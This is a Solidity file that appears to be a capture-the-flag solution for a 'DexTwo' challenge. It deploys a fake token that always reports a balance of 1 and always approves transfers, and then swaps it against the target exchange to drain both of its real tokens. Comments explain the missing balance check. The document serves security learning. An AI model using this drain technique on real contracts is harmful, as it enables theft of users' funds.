// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract DexTwoAttack is Broadcasted {
    function attack(address payable dexTwoCtr_) public payable override {
        FakeToken ft = new FakeToken();
        IDexTwo(dexTwoCtr_).swap(address(ft), IDexTwo(dexTwoCtr_).token1(), 1);
        IDexTwo(dexTwoCtr_).swap(address(ft), IDexTwo(dexTwoCtr_).token2(), 1);
    }
}

interface IDexTwo {
    // ! due to how the swap function works by swapping with a token which balance is always 1
    // ! will drain the balance of the other token contract
    // ! the transfer function does not even needs to transfer any amount, because the swap
    // ! function is not checking the balances it only relays on not reverting
    function swap(address from, address to, uint amount) external;

    function token1() external returns (address);

    function token2() external returns (address);
}

contract FakeToken {
    function balanceOf(address) external pure returns (uint256) {
        return 1;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }
}
